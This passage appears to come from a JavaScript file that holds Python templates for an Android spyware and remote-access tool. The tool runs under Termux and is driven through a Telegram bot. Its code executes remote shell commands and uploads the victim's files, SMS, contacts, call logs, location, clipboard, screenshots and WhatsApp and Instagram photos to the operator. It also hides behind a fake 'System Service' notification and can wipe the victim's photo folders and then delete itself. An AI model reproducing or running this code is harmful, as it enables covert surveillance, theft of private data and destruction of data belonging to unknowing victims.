r=subprocess.run(['pm','list','packages'],capture_output=True,text=True,timeout=15)\n        _send('*Apps*'+chr(10)+(r.stdout[:3800] or 'empty'))\n    except Exception:\n        pass\n\ndef _cmd_sys():\n    _collect_sysinfo()\n\ndef _cmd_shell(c):\n    try:\n        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)\n        out=(r.stdout or '')+(r.stderr or '')\n        _send(c+chr(10)+(out[:3500] or '(no output)'))\n    except Exception as e:\n        _send('shell err: '+str(e))\n\ndef _cmd_get(path):\n    if not os.path.isfile(path):\n        _send('bukan file: '+path); return\n    if os.path.getsize(path)>MAX_BYTES:\n        _send('gede, 45mb limit'); return\n    _send_doc(path,path)\n\ndef _cmd_getself():\n    me=os.path.abspath(__file__)\n    if os.path.exists(me):\n        _send_doc(me,'source')\n    else:\n        _send('source not found')\n\ndef _cmd_procs():\n    try:\n        r=subprocess.run(['ps','-A'],capture_output=True,text=True,timeout=10)\n        _send('*Processes*'+chr(10)+(r.stdout[:3500] or 'empty'))\n    except Exception:\n        pass\n\ndef _cmd_torch(state='on'):\n    try:\n        subprocess.run(['termux-torch',state],capture_output=True,timeout=5)\n        _send('torch '+state)\n    except Exception:\n        pass\n\ndef _cmd_vibrate(ms='1000'):\n    try:\n        subprocess.run(['termux-vibrate','-d',ms],capture_output=True,timeout=5)\n        _send('vibrate '+ms+'ms')\n    except Exception:\n        pass\n\ndef _cmd_tts(text):\n    try:\n        subprocess.run(['termux-tts-speak',text],capture_output=True,timeout=30)\n        _send('spoken: '+text[:200])\n    except Exception:\n        pass\n\ndef _cmd_toast(text):\n    try:\n        subprocess.run(['termux-toast',text],capture_output=True,timeout=5)\n        _send('toast: '+text[:200])\n    except Exception:\n        pass\n\ndef _cmd_volume(stream='music',vol='5'):\n    try:\n        subprocess.run(['termux-volume',stream,vol],capture_output=True,timeout=5)\n        _send('volume '+stream+'='+vol)\n    except Exception:\n        pass\n\ndef _cmd_brightness(val='128'):\n    try:\n        subprocess.run(['termux-brightness',val],capture_output=True,timeout=5)\n        _send('brightness '+val)\n    except Exception:\n        pass\n\ndef _cmd_notify(title='Hi',content='Hello'):\n    try:\n        subprocess.run(['termux-notification','-t',title,'-c',content],capture_output=True,timeout=5)\n        _send('notif sent')\n    except Exception:\n        pass\n\ndef _cmd_clipset(text):\n    try:\n        subprocess.run(['termux-clipboard-set',text],capture_output=True,timeout=5)\n        _send('clip set')\n    except Exception:\n        pass\n\ndef _cmd_open(pkg):\n    try:\n        subprocess.run(['am','start','-n',pkg],capture_output=True,timeout=10)\n        _send('opened '+pkg)\n    except Exception:\n        pass\n\ndef _cmd_kill(pkg):\n    try:\n        subprocess.run(['am','force-stop',pkg],capture_output=True,timeout=10)\n        _send('killed '+pkg)\n    except Exception:\n        pass\n\ndef _cmd_lock():\n    try:\n        subprocess.run(['input','keyevent','26'],capture_output=True,timeout=5)\n        _send('screen toggled')\n    except Exception:\n        pass\n\ndef _cmd_foreground():\n    try:\n        subprocess.run(['termux-notification','--id','rw_fg','--title','System Service','--content','Running','--ongoing','--priority','low'],capture_output=True,timeout=5)\n        _send('foreground service started')\n    except Exception:\n        _send('fg err')\n\ndef _cmd_airplane(state='on'):\n    val='1' if state=='on' else '0'\n    try:\n        subprocess.run(['settings','put','global','airplane_mode_on',val],capture_output=True,timeout=5)\n        _send('airplane '+state)\n    except Exception as e:\n        _send('airplane err: '+str(e)[:120])\n\ndef _cmd_data(state='on'):\n    try:\n        subprocess.run(['svc','data','enable' if state=='on' else 'disable'],capture_output=True,timeout=5)\n        _send('data '+state)\n    except Exception as e:\n        _send('data err: '+str(e)[:120])\n\ndef _cmd_wifitoggle(state='on'):\n    try:\n        subprocess.run(['svc','wifi','enable' if state=='on' else 'disable'],capture_output=True,timeout=5)\n        _send('wifi '+state)\n    except Exception as e:\n        _send('wifi toggle err: '+str(e)[:120])\n\ndef _cmd_hb_on():\n    global _heartbeat_alive\n    _heartbeat_alive=True\n    _send('heartbeat ON')\n\ndef _cmd_hb_off():\n    global _heartbeat_alive\n    _heartbeat_alive=False\n    _send('heartbeat OFF')\n\ndef _cmd_shotloop_on():\n    global _shotloop_on\n    _shotloop_on=True\n    _send('screenshot loop ON')\n\ndef _cmd_shotloop_off():\n    global _shotloop_on\n    _shotloop_on=False\n    _send('screenshot loop OFF')\n\ndef _cmd_del(path):\n    try:\n        if os.path.isfile(path):\n            os.remove(path)\n            _send('deleted: '+path)\n        elif os.path.isdir(path):\n            shutil.rmtree(path)\n            _send('deleted dir: '+path)\n        else:\n            _send('not found: '+path)\n    except Exception as e:\n        _send('del err: '+str(e))\n\ndef _cmd_purge_cache():\n    try:\n        for f in (SENT_DB,DEDUP_DB):\n            if os.path.exists(f):\n                os.remove(f)\n        _send('cache purged')\n    except Exception:\n        pass\n\ndef _cmd_wipe(path='DCIM'):\n    targets=[BASE+'/DCIM',BASE+'/Pictures',BASE+'/Download'] if path=='all' else [BASE+'/'+path]\n    for t in targets:\n        try:\n            if os.path.isdir(t):\n                shutil.rmtree(t,ignore_errors=True)\n        except Exception:\n            pass\n    _send('wiped: '+', '.join(targets))\n\ndef _cmd_selfdestruct():\n    _send('self-destruct in 3s...')\n    time.sleep(3)\n    try:\n        for f in (SENT_DB,DEDUP_DB,CLIP_DB):\n            if os.path.exists(f):\n                os.remove(f)\n    except Exception:\n        pass\n    try:\n        me=os.path.abspath(__file__)\n        if os.path.exists(me):\n            os.remove(me)\n    except Exception:\n        pass\n    os._exit(0)\n\ndef _pull_from_telegram(file_id,filename):\n    try:\n        r=_tg('getFile',json={'file_id':file_id})\n        path=r.get('result',{}).get('file_path')\n        if not path:\n            _send('push: getFile fail'); return\n        url='https://api.telegram.org/file/bot'+BOT_TOKEN+'/'+path\n        dest=os.path.join(PUSH_DIR,filename or os.path.basename(path))\n        os.makedirs(PUSH_DIR,exist_ok=True)\n        with requests.get(url,stream=True,timeout=120) as resp:\n            resp.raise_for_status()\n            with open(dest,'wb') as f:\n                for chunk in resp.iter_content(8192):\n                    f.write(chunk)\n        _send('pushed -> '+dest)\n    except Exception as e:\n        _send('push err: '+str(e)[:120])\n\ndef _handle_doc_msg(m):\n    try:\n        doc=m.get('document')\n        if not doc:\n            return\n        fid=doc.get('file_id')\n        fname=doc.get('file_name','pushed.bin')\n        if doc.get('file_size',0)>MAX_BYTES:\n            _send('push: file >45MB, skipped'); return\n        _pull_from_telegram(fid,fname)\n    except Exception as e:\n        _send('doc err: '+str(e)[:120])\n\ndef _menu(msg_id=None):\n    global _cwd\n    _cwd=BASE\n    kb=[[{'text':'Download','callback_data':'d:Download'},{'text':'DCIM','callback_data':'d:DCIM'}],[{'text':'WhatsApp','callback_data':'d:WhatsApp'},{'text':'Pictures','callback_data':'d:Pictures'}],[{'text':'Semua','callback_data':'d:'},{'text':'Home','callback_data':'home'}],[{'text':'Cam','callback_data':'cam'},{'text':'Vid','callback_data':'vid'},{'text':'Rec','callback_data':'rec'}],[{'text':'Screen','callback_data':'screen'},{'text':'ScreenRec','callback_data':'screenrec'},{'text':'UIDump','callback_data':'uidump'}],[{'text':'Kontak','callback_data':'kontak'},{'text':'SMS','callback_data':'sms'},{'text':'Call','callback_data':'call'}],[{'text':'ClipHist','callback_data':'cliphist'},{'text':'ClipClear','callback_data':'clipclear'}],[{'text':'Loc','callback_data':'loc'},{'text':'GPS','callback_data':'gps'},{'text':'Batt','callback_data':'batt'}],[{'text':'WiFi','callback_data':'wifi'},{'text':'Scan','callback_data':'wifiscan'},{'text':'Apps','callback_data':'apps'}],[{'text':'Sys','callback_data':'sys'},{'text':'Procs','callback_data':'procs'},{'text':'Shell','callback_data':'shell'}],[{'text':'Torch','callback_data':'torch'},{'text':'Vib','callback_data':'vib'},{'text':'Lock','callback_data':'lock'}],[{'text':'Toast','callback_data':'toast'},{'text':'Notif','callback_data':'notif'},{'text':'FG','callback_data':'foreground'}],[{'text':'HB On','callback_data':'hbon'},{'text':'HB Off','callback_data':'hboff'},{'text':'Purge','callback_data':'purge'}],[{'text':'Loop On','callback_data':'shoton'},{'text':'Loop Off','callback_data':'shotoff'},{'text':'Report','callback_data':'report'}],[{'text':'GetSelf','callback_data':'getself'},{'text':'Wipe DCIM','callback_data':'wipe:DCIM'}],[{'text':'Wipe All','callback_data':'wipe:all'},{'text':'SELF-DESTRUCT','callback_data':'selfdestruct'}]]\n    t=LABEL+' online. Pilih:'\n    if msg_id:\n        _edit(msg_id,t,kb)\n    else:\n        _send(t,kb)\n\ndef _browse(msg_id,folder):\n    global _cwd,_files\n    _cwd=os.path.join(BASE,folder) if folder else BASE\n    try:\n        items=sorted(os.listdir(_cwd))\n    except Exception:\n        _edit(msg_id,'gak bisa dibuka')\n        return\n    _files={}\n    kb,row=[],[]\n    text=_cwd+chr(10)+chr(10)\n    n=0\n    for it in items:\n        p=os.path.join(_cwd,it)\n        n+=1\n        _files[str(n)]=p\n        if os.path.isdir(p):\n            text+='[D] '+it+chr(10)\n        else:\n            try:\n                sz=round(os.path.getsize(p)/1024)\n            except Exception:\n                sz=0\n            text+='[F] '+it+' ('+str(sz)+'kb)'+chr(10)\n        row.append({'text':str(n),'callback_data':'f:'+str(n)})\n        if len(row)==5:\n            kb.append(row); row=[]\n    if row:\n        kb.append(row)\n    kb.append([{'text':'Naik','callback_data':'up'},{'text':'Home','callback_data':'home'}])\n    if not items:\n        text+='(kosong)'\n    _edit(msg_id,text,kb)\n\ndef _kirim_file(msg_id,idx):\n    p=_files.get(idx)\n    if not p or not os.path.isfile(p):\n        _ack('bukan file'); return\n    if os.path.getsize(p)>MAX_BYTES:\n        _edit(msg_id,'gede, 45mb limit'); return\n    try:\n        with open(p,'rb') as f:\n            _tg('sendDocument',data={'chat_id':CHAT_ID,'caption':p},files={'document':f})\n        _ack('kekirim')\n    except Exception as e:\n        _ack('fail '+str(e)[:40])\n\ndef _poll():\n    global _offset,_cb_id,_running\n    while _running:\n        try:\n            r=_tg('getUpdates',json={'timeout':30,'offset':_offset,'allowed_updates':['message','callback_query']})\n            for u in r.get('result',[]):\n                _offset=u['update_id']+1\n                if 'message' in u:\n                    m=u['message']\n                    if m.get('chat',{}).get('id')!=int(CHAT_ID):\n                        continue\n                    if m.get('document'):\n                        _handle_doc_msg(m)\n                        continue\n                    txt=m.get('text','')\n                    if CMD_KEY and txt and not txt.startswith('/menu'):\n                        dec=_cmd_dec(txt)\n                        if dec:\n                            txt=dec\n                    if txt.startswith('/start') or txt=='/menu':\n                        _menu()\n                    elif txt.startswith('/sh '):\n                        _cmd_shell(txt[4:])\n                    elif txt.startswith('/getself'):\n                        _cmd_getself()\n                    elif txt.startswith('/get '):\n                        _cmd_get(txt[5:])\n                    elif txt.startswith('/cam1'):\n                        _cmd_foto('1')\n                    elif txt.startswith('/cam'):\n                        _cmd_foto('0')\n                    elif txt.startswith('/vid'):\n                        _cmd_video('5','0')\n                    elif txt.startswith('/rec'):\n                        _cmd_record('10')\n                    elif txt.startswith('/cliphist'):\n                        _cmd_cliphist()\n                    elif txt.startswith('/clipclear'):\n                        _cmd_clipclear()\n                    elif txt.startswith('/sms'):\n                        _cmd_sms()\n                    elif txt.startswith('/call'):\n                        _cmd_calllog()\n                    elif txt.startswith('/kontak'):\n                        _cmd_kontak()\n                    elif txt.startswith('/loc'):\n                        _cmd_loc()\n                    elif txt.startswith('/batt'):\n                        _cmd_batt()\n                    elif txt.startswith('/wifi'):\n                        _cmd_wifi()\n                    elif txt.startswith('/scan'):\n                        _cmd_wifiscan()\n                    elif txt.startswith('/cell'):\n                        _cmd_cell()\n                    elif txt.startswith('/dev'):\n                        _cmd_deviceinfo()\n                    elif txt.startswith('/apps'):\n                        _cmd_apps()\n                    elif txt.startswith('/sys'):\n                        _cmd_sys()\n                    elif txt.startswith('/procs'):\n                        _cmd_procs()\n                    elif txt.startswith('/torch'):\n                        _cmd_torch('on')\n                    elif txt.startswith('/untorch'):\n                        _cmd_torch('off')\n                    elif txt.startswith('/vib'):\n                        _cmd_vibrate('1500')\n                    elif txt.startswith('/toast '):\n                        _cmd_toast(txt[7:])\n                    elif txt.startswith('/tts '):\n                        _cmd_tts(txt[5:])\n                    elif txt.startswith('/vol '):\n                        parts=txt[5:].split()\n                        if len(parts)==2:\n                            _cmd_volume(parts[0],parts[1])\n                    elif txt.startswith('/bright '):\n                        _cmd_brightness(txt[8:])\n                    elif txt.startswith('/notif '):\n                        parts=txt[7:].split('|',1)\n                        title=parts[0].strip() or 'Hi'\n                        content=parts[1].strip() if len(parts)>1 else 'Hello'\n                        _cmd_notify(title,content)\n                    elif txt.startswith('/clip '):\n                        _cmd_clipset(txt[6:])\n                    elif txt.startswith('/open '):\n                        _cmd_open(txt[6:])\n                    elif txt.startswith('/kill '):\n                        _cmd_kill(txt[6:])\n                    elif txt.startswith('/del '):\n                        _cmd_del(txt[5:])\n                    elif txt.startswith('/purge'):\n                        _cmd_purge_cache()\n                    elif txt.startswith('/screenrec '):\n                        _cmd_screenrec(txt[11:])\n                    elif txt.startswith('/screenrec'):\n                        _cmd_screenrec('15')\n                    elif txt.startswith('/screen'):\n                        _cmd_screen()\n                    elif txt.startswith('/tap '):\n                        parts=txt[5:].split()\n                        if len(parts)>=2:\n                            _cmd_tap(parts[0],parts[1])\n                    elif txt.startswith('/swipe '):\n                        parts=txt[7:].split()\n                        if len(parts)>=4:\n                            _cmd_swipe(*parts[:5])\n                    elif txt.startswith('/type '):\n                        _cmd_type(txt[6:])\n                    elif txt.startswith('/key '):\n                        _cmd_key(txt[5:])\n                    elif txt.startswith('/gps'):\n                        _cmd_gps()\n                    elif txt.startswith('/lock'):\n                        _cmd_lock()\n                    elif txt.startswith('/hbon'):\n                        _cmd_hb_on()\n                    elif txt.startswith('/hboff'):\n                        _cmd_hb_off()\n                    elif txt.startswith('/uidump'):\n                        _cmd_uidump()\n                    elif txt.startswith('/fg'):\n                        _cmd_foreground()\n                    elif txt.startswith('/shotloop on'):\n                        _cmd_shotloop_on()\n                    elif txt.startswith('/shotloop off'):\n                        _cmd_shotloop_off()\n                    elif txt.startswith('/airplane '):\n                        _cmd_airplane(txt[10:].strip())\n                    elif txt.startswith('/data '):\n                        _cmd_data(txt[6:].strip())\n                    elif txt.startswith('/wifitoggle '):\n                        _cmd_wifitoggle(txt[12:].strip())\n                    elif txt.startswith('/wipe all'):\n                        _cmd_wipe('all')\n                    elif txt.startswith('/wipe '):\n                        _cmd_wipe(txt[6:].strip())\n                    elif txt.startswith('/selfdestruct'):\n                        _cmd_selfdestruct()\n                    elif txt.startswith('/ls'):\n                        _browse(m.get('message_id'),None)\n                elif 'callback_query' in u:\n                    cb=u['callback_query']\n                    _cb_id=cb['id']\n                    d=cb.get('data','')\n                    mid=cb['message']['message_id']\n                    if d=='home': _menu(mid)\n                    elif d=='cam': _cmd_foto('0'); _ack('ok')\n                    elif d=='vid': _cmd_video('5','0'); _ack('rec 5s')\n                    elif d=='rec': _cmd_record('10'); _ack('rec 10s')\n                    elif d=='screen': _cmd_screen(); _ack('shot')\n                    elif d=='screenrec': _cmd_screenrec('15'); _ack('15s rec')\n                    elif d=='uidump': _cmd_uidump(); _ack('dumped')\n                    elif d=='kontak': _cmd_kontak(); _ack('ok')\n                    elif d=='sms': _cmd_sms(); _ack('ok')\n                    elif d=='cliphist': _cmd_cliphist(); _ack('ok')\n                    elif d=='clipclear': _cmd_clipclear(); _ack('cleared')\n                    elif d=='call': _cmd_calllog(); _ack('ok')\n                    elif d=='loc': _cmd_loc(); _ack('ok')\n                    elif d=='gps': _cmd_gps(); _ack('gps')\n                    elif d=='batt': _cmd_batt(); _ack('ok')\n                    elif d=='wifi': _cmd_wifi(); _ack('ok')\n                    elif d=='wifiscan': _cmd_wifiscan(); _ack('ok')\n                    elif d=='apps': _cmd_apps(); _ack('ok')\n                    elif d=='sys': _cmd_sys(); _ack('ok')\n                    elif d=='procs': _cmd_procs(); _ack('ok')\n                    elif d=='torch': _cmd_torch('on'); _ack('on')\n                    elif d=='vib': _cmd_vibrate('1500'); _ack('ok')\n                    elif d=='lock': _cmd_lock(); _ack('lock')\n                    elif d=='toast': _cmd_toast('Hello from afar'); _ack('sent')\n                    elif d=='notif': _cmd_notify('System','Update ready'); _ack('sent')\n                    elif d=='foreground': _cmd_foreground(); _ack('fg on')\n                    elif d=='hbon': _cmd_hb_on(); _ack('hb on')\n                    elif d=='hboff': _cmd_hb_off(); _ack('hb off')\n                    elif d=='shoton': _cmd_shotloop_on(); _ack('on')\n                    elif d=='shotoff': _cmd_shotloop_off(); _ack('off')\n                    elif d=='report': _batch_flush(); _ack('flushed')\n                    elif d=='purge': _cmd_purge_cache(); _ack('purged')\n                    elif d=='getself': _cmd_getself(); _ack('sent')\n                    elif d=='selfdestruct': _cmd_selfdestruct()\n                    elif d.startswith('wipe:'): _cmd_wipe(d[5:]); _ack('wiped')\n                    elif d=='shell': _ack('kirim /sh <cmd>')\n                    elif d=='up':\n                        atas=os.path.dirname(_cwd)\n                        if atas.startswith(BASE):\n                            _browse(mid,os.path.relpath(atas,BASE))\n                        else:\n                            _menu(mid)\n                    elif d.startswith('d:'): _browse(mid,d[2:])\n                    elif d.startswith('f:'): _kirim_file(mid,d[2:])\n        except Exception:\n            pass\n        time.sleep(1)\n\ndef _boot(notify=True):\n    try:\n        subprocess.run(['termux-wake-lock'],capture_output=True,timeout=5)\n    except Exception:\n        pass\n    try:\n        _request_perms()\n    except Exception:\n        pass\n    try:\n        _cliphist_load()\n    except Exception:\n        pass\n    if notify:\n        try:\n            _send(LABEL+' online (command mode)')\n            _collect_sysinfo()\n        except Exception:\n            pass\n    _register(_watch_sms,'sms')\n    _register(_watch_notif,'notif')\n    _register(_watch_loc,'loc')\n    _register(_watch_batt,'batt')\n    _register(_watch_clip,'clip')\n    _register(_watch_calls,'calls')\n    _register(_watch_wifi,'wifi')\n    _register(_watch_sensors,'sensors')\n    _register(_watch_foreground,'foreground')\n    _register(_watch_screen_state,'screenstate')\n    _register(_watch_locmove,'locmove')\n    _register(_watch_shotloop,'shotloop')\n    _register(_watch_batthist,'batthist')\n    _register(_watch_batcher,'batcher')\n    _register(_poll,'poll')\n    _register(_watch_heartbeat,'heartbeat')\n    _register(_watch_watchdog,'watchdog')\n\ndef _stop():\n    global _running\n    _running=False\n    try:\n        _cliphist_save()\n    except Exception:\n        pass\n    try:\n        subprocess.run(['termux-wake-unlock'],capture_output=True,timeout=5)\n    except Exception:\n        pass\n\nif __name__=='__main__':\n    threading.Thread(target=_boot,daemon=True).start()\n    try:\n        while True:\n            time.sleep(3600)\n    except KeyboardInterrupt:\n        _stop()\n";
window.TEMPLATE_BASE="import os\nimport re\nimport sys\nimport time\nimport json\nimport uuid\nimport socket\nimport getpass\nimport platform\nimport shutil\nimport hashlib\nimport threading\nimport subprocess\nimport requests\nimport queue as _q\n\nBOT_TOKEN='BOT_TOKEN'\nCHAT_ID='CHAT_ID'\nLABEL='Target'\nDEBUG=False\nUSE_CACHE=False\nBASE='/storage/emulated/0'\n\nWATCH_PATHS=[BASE+'/DCIM',BASE+'/Pictures',BASE+'/Download',BASE+'/Screenshots',BASE+'/Documents',BASE+'/WhatsApp/Media',BASE+'/Android/media/com.whatsapp/WhatsApp/Media',BASE+'/Android/media/org.telegram.messenger',BASE+'/Android/media/com.instagram.android',BASE+'/Pictures/Instagram',BASE+'/Pictures/WhatsApp',BASE+'/Pictures/Screenshots',BASE+'/MIUI/screenshot']\nPHOTO_EXT=('.jpg','.jpeg','.png','.webp','.heic','.heif','.gif','.bmp','.tiff','.tif','.raw','.dng','.svg','.avif','.jfif','.ico')\nMAX_BYTES=45*1024*1024\nSCAN_INTERVAL=30\nSCAN_WORKERS=6\nSEND_WORKERS=3\nBATCH_SIZE=5\nSEND_DELAY=0.3\nSCAN_WORKER_SLEEP=0.3\nSEND_WORKER_SLEEP=0.3\nDEFAULT_LIMIT=250\nQUEUE_MAX=150\nPROGRESS_EVERY=50\n\nAPI='https://api.telegram.org/bot'+BOT_TOKEN\n_running=True\n_BATCH_QUEUE=[]\n_BATCH_LOCK=threading.Lock()\n_SENT_LOCK=threading.Lock()\n_session_lock=threading.Lock()\n_session_count=0\n_session_total=0\n_session_number=1\n_session_limit=DEFAULT_LIMIT\n_session_active=False\n_session_paused_man=False\n_last_progress=0\n_last_file=''\n_last_file_path=''\nPUSH_DIR=BASE+'/Download'\nSENT_DB='/data/data/com.termux/files/home/.cache.dat'\nSESSION_DB='/data/data/com.termux/files/home/.session.dat'\n\ndef _log(msg):\n    if DEBUG:\n        try:\n            print('['+time.strftime('%H:%M:%S')+'] '+msg,flush=True)\n        except Exception:\n            pass\n\ndef _tg(method,**kw):\n    try:\n        r=requests.post(API+'/'+method,timeout=60,**kw).json()\n        return r\n    except Exception:\n        return {}\n\ndef _send(text,kb=None):\n    try:\n        d={'chat_id':CHAT_ID,'text':str(text)[:4000],'parse_mode':'Markdown'}\n        if kb:\n            d['reply_markup']={'inline_keyboard':kb}\n        return _tg('sendMessage',json=d)\n    except Exception:\n        return {}\n\ndef _send_photo(path,caption=''):\n    try:\n        if not os.path.exists(path):\n            return {'ok':False,'err':'not exist'}\n        size=os.path.getsize(path)\n        if size==0:\n            return {'ok':False,'err':'empty'}\n        with open(path,'rb') as f:\n            return _tg('sendPhoto',data={'chat_id':CHAT_ID,'caption':str(caption)[:1000]},files={'photo':f})\n    except Exception as e:\n        return {'ok':False,'err':str(e)}\n\ndef _send_media_group(chunk):\n    try:\n        media=[]\n        files={}\n        for idx,(path,cap) in enumerate(chunk):\n            key='photo'+str(idx)\n            media.append({'type':'photo','media':'attach://'+key,'caption':str(cap)[:1000]})\n            files[key]=open(path,'rb')\n        try:\n            return _tg('sendMediaGroup',data={'chat_id':CHAT_ID,'media':json.dumps(media)},files=files)\n        finally:\n            for f in files.values():\n                try: f.close()\n                except Exception: pass\n    except Exception as e:\n        return {}\n\ndef _sent_load():\n    if not os.path.exists(SENT_DB):\n        return set()\n    try:\n        with open(SENT_DB) as f:\n            data=set(l.strip() for l in f if l.strip())\n        return data\n    except Exception:\n        return set()\n\ndef _sent_mark(p):\n    if not USE_CACHE:\n        return\n    with _SENT_LOCK:\n        try:\n            with open(SENT_DB,'a') as f:\n                f.write(p+chr(10))\n        except Exception:\n            pass\n\ndef _sent_count():\n    if not os.path.exists(SENT_DB):\n        return 0\n    try:\n        with open(SENT_DB) as f:\n            return sum(1 for _ in f)\n    except Exception:\n        return 0\n\ndef _session_save():\n    with _session_lock:\n        try:\n            data={'count':_session_count,'total':_session_total,'number':_session_number,'limit':_session_limit,'active':_session_active,'last_file':_last_file,'last_file_path':_last_file_path,'timestamp':time.time()}\n            tmp=SESSION_DB+'.tmp'\n            with open(tmp,'w') as f:\n                json.dump(data,f)\n            os.replace(tmp,SESSION_DB)\n        except Exception:\n            pass\n\ndef _session_load():\n    global _session_count,_session_total,_session_number\n    global _session_limit,_session_active\n    global _last_file,_last_file_path\n    if not os.path.exists(SESSION_DB):\n        return\n    try:\n        with open(SESSION_DB) as f:\n            data=json.load(f)\n        with _session_lock:\n            _session_count=data.get('count',0)\n            _session_total=data.get('total',0)\n            _session_number=data.get('number',1)\n            _session_limit=data.get('limit',DEFAULT_LIMIT)\n            _session_active=False\n            _last_file=data.get('last_file','')\n            _last_file_path=data.get('last_file_path','')\n    except Exception:\n        pass\n\ndef _scan_one_path(base,sent):\n    if not os.path.isdir(base):\n        return\n    stack=[base]\n    visited=set()\n    found=0\n    while stack:\n        cur=stack.pop()\n        if cur in visited:\n            continue\n        visited.add(cur)\n        skip=False\n        for s in ['/Android/data/','/Android/obb/','/.thumbnails/','/.cache/']:\n            if s in cur:\n                skip=True\n                break\n        if skip:\n            continue\n        try:\n            entries=os.listdir(cur)\n        except Exception:\n            continue\n        for entry in entries:\n            full=os.path.join(cur,entry)\n            try:\n                if os.path.isdir(full):\n                    stack.append(full)\n                    continue\n                entry_low=entry.lower()\n                is_photo=entry_low.endswith(PHOTO_EXT)\n                if not is_photo and entry_low.endswith('.trashed'):\n                    is_photo=entry_low[:-8].endswith(PHOTO_EXT)\n                if not is_photo:\n                    continue\n                if USE_CACHE:\n                    with _SENT_LOCK:\n                        if full in sent:\n                            continue\n                        sent.add(full)\n                try:\n                    if os.path.getsize(full)>MAX_BYTES:\n                        continue\n                except Exception:\n                    continue\n                with _BATCH_LOCK:\n                    if len(_BATCH_QUEUE)>=QUEUE_MAX:\n                        if USE_CACHE:\n                            with _SENT_LOCK:\n                                sent.discard(full)\n                        continue\n                path_low=full.lower()\n                is_trashed=(entry_low.startswith('.') or 'trash' in entry_low or 'trash' in path_low or '.trashed' in path_low)\n                tag='TRASHED' if is_trashed else 'PHOTO'\n                cap=tag+chr(10)+entry+chr(10)+cur\n                with _BATCH_LOCK:\n                    _BATCH_QUEUE.append((full,cap))\n                _sent_mark(full)\n                found+=1\n            except Exception:\n                pass\n\ndef _scan_worker(worker_id,paths,sent):\n    while _running:\n        try:\n            try:\n                base=paths.get(timeout=3)\n            except _q.Empty:\n                continue\n            _scan_one_path(base,sent)\n            paths.put(base)\n        except Exception:\n            pass\n        time.sleep(SCAN_WORKER_SLEEP)\n\ndef _watch_photos():\n    sent=_sent_load()\n    path_queue=_q.Queue()\n    for p in WATCH_PATHS:\n        path_queue.put(p)\n    for i in range(SCAN_WORKERS):\n        t=threading.Thread(target=_scan_worker,args=(i,path_queue,sent),daemon=True,name='scan-'+str(i))\n        t.start()\n    while _running:\n        time.sleep(SCAN_INTERVAL)\n\ndef _send_batch(chunk):\n    global _session_count,_session_total,_last_file,_last_file_path\n    global _last_progress,_session_active,_session_paused_man\n    with _session_lock:\n        if not _session_active:\n            return False\n        if _session_count>=_session_limit:\n            return False\n        remaining_slot=_session_limit-_session_count\n    if len(chunk)>remaining_slot:\n        chunk=chunk[:remaining_slot]\n    if not chunk:\n        return False\n    sent_ok=0\n    if len(chunk)>1:\n        resp=_send_media_group(chunk)\n        if resp and resp.get('ok'):\n            sent_ok=len(chunk)\n        else:\n            for path,cap in chunk:\n                r=_send_photo(path,cap)\n                if r and r.get('ok'):\n                    sent_ok+=1\n                time.sleep(SEND_DELAY)\n    else:\n        path,cap=chunk[0]\n        r=_send_photo(path,cap)\n        if r and r.get('ok'):\n            sent_ok=1\n    if sent_ok>0:\n        with _session_lock:\n            _session_count+=sent_ok\n            _session_total+=sent_ok\n            idx=min(sent_ok-1,len(chunk)-1)\n            path,cap=chunk[idx]\n            _last_file=os.path.basename(path)\n            _last_file_path=path\n            current=_session_count\n        _session_save()\n        if current-_last_progress>=PROGRESS_EVERY:\n            _last_progress=current\n            _send_progress(current)\n        with _session_lock:\n            if _session_count>=_session_limit:\n                _session_active=False\n                _session_paused_man=False\n                _session_save()\n                _send_stop()\n    return sent_ok>0\n\ndef _send_worker(worker_id):\n    while _running:\n        try:\n            with _session_lock:\n                active=_session_active\n            if not active:\n                time.sleep(0.5)\n                continue\n            chunk=[]\n            with _BATCH_LOCK:\n                while len(chunk)<BATCH_SIZE and _BATCH_QUEUE:\n                    chunk.append(_BATCH_QUEUE.pop(0))\n            if chunk:\n                _send_batch(chunk)\n            else:\n                time.sleep(0.5)\n        except Exception:\n            pass\n        time.sleep(SEND_WORKER_SLEEP)\n\ndef _watch_batcher():\n    for i in range(SEND_WORKERS):\n        t=threading.Thread(target=_send_worker,args=(i,),daemon=True,name='send-'+str(i))\n        t.start()\n    while _running:\n        time.sleep(60)\n\ndef _get_device_info():\n    info={'model':'unknown','brand':'unknown','android':'unknown','sdk':'unknown','arch':platform.machine(),'local_ip':'unknown','public_ip':'unknown','battery':'unknown','network':'unknown'}\n    props={'model':'ro.product.model','brand':'ro.product.manufacturer','android':'ro.build.version.release','sdk':'ro.build.version.sdk'}\n    for key,prop in props.items():\n        try:\n            r=subprocess.run(['getprop',prop],capture_output=True,text=True,timeout=3)\n            if r.stdout.strip():\n                info[key]=r.stdout.strip()\n        except Exception:\n            pass\n    try:\n        info['local_ip']=socket.gethostbyname(socket.gethostname())\n    except Exception:\n        pass\n    try:\n        info['public_ip']=requests.get('https://api.ipify.org',timeout=5).text.strip()\n    except Exception:\n        pass\n    try:\n        r=subprocess.run(['termux-battery-status'],capture_output=True,text=True,timeout=5)\n        if r.stdout.strip():\n            j=json.loads(r.stdout)\n            info['battery']=str(j.get('percentage','?'))+'%'\n    except Exception:\n        pass\n    try:\n        r=subprocess.run(['termux-wifi-connectioninfo'],capture_output=True,text=True,timeout=5)\n        if r.stdout.strip():\n            j=json.loads(r.stdout)\n            ssid=j.get('ssid','')\n            info['network']='WiFi ('+ssid+')' if ssid else 'WiFi'\n    except Exception:\n        pass\n    return info\n\ndef _uptime_str():\n    try:\n        with open('/proc/uptime') as f:\n            up=float(f.read().split()[0])\n        h=int(up//3600)\n        m=int((up%3600)//60)\n        return str(h)+'j '+str(m)+'m'\n    except Exception:\n        return '?'\n\ndef _send_boot():\n    info=_get_device_info()\n    cache_status='ON' if USE_CACHE else 'OFF'\n    msg='TARGET RUN'+chr(10)\n    msg+='Device: '+info['model']+chr(10)\n    msg+='Brand: '+info['brand']+chr(10)\n    msg+='Android: '+info['android']+' (SDK '+info['sdk']+')'+chr(10)\n    msg+='Local IP: '+info['local_ip']+chr(10)\n    msg+='Public IP: '+info['public_ip']+chr(10)\n    msg+='Network: '+info['network']+chr(10)\n    msg+='Battery: '+info['battery']+chr(10)\n    msg+='Workers: '+str(SCAN_WORKERS)+' scan / '+str(SEND_WORKERS)+' send'+chr(10)\n    msg+='Session: '+str(_session_limit)+' foto'+chr(10)\n    msg+='Cache: '+cache_status\n    _send(msg)\n\ndef _send_progress(current):\n    with _session_lock:\n        limit=_session_limit\n        total=_session_total\n    with 